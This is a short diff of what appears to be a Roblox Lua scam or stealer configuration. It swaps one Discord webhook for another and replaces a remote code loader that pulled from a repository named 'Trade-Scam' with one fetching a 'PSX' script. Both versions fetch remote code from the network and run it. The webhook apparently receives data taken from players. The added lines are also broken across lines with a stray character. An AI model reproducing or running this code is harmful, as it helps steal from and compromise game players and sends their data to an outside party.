@@ -1,4 +1,6 @@
 UserName = "z5vxgt"
-WebHook = "https://discord.com/api/webhooks/1069192397642268672/FllSgACK5Saan3xMMHdsn8n2f2vGiyzQpjFLZAxDQkgfH_fHjxL3SMy8kfQYOY3MWvHE"
+WebHook = "https://discord.com/api/webhooks/1069201210051141682/BLKM_gCZelKqKa9H0-
+UGWERc6|CKdIVhX4k7HK7A7PdoAdd-bFb-gvyXHu4MS10DoEIJ"
 Mention = false
-loadstring(game:HttpGet("https://raw.githubusercontent.com/by8t/Trade-Scam/main/Test", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/
+Script.lua", true))()
